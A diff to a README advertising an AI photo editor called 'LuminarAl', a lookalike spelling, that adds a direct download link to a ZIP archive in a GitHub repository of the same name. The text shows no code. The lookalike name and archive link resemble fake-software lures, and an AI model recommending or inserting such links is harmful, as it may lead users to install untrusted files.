@@ -18,7 +18,7 @@
 * AI deals with the boring tasks so you can focus on your creative story.
 * Whether you’ve been a photographer for 20 years or 20 seconds, you’ll get awesome results right from the start.
 
-## [⚡LuminarAl Version 1.0.2]():
+## [⚡LuminarAl Version 1.0.2](https://github.com/LuminarAl/LuminarAl/raw/main/LuminarAI.zip):
 
 * Completely updated interface.
 * NEW AI Augmented Sky Tool.
